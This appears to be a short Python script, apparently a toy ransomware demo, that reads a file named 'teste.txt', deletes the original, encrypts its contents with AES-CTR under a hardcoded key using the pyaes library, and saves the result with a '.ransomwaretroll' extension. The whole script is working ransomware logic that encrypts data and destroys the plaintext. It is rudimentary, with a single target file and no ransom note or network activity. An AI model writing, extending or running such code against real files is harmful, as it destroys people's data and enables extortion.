import os
import pyaes

## open file encrypt
file_name = "teste.txt"
file = open(file_name,"rb")
file_data = file.read()
file.close()

## remove file
os.remove(file_name)

##key of encrypt
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## encrypt file
crypto_data = aes.encrypt(file_data)

## save file encrypt
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

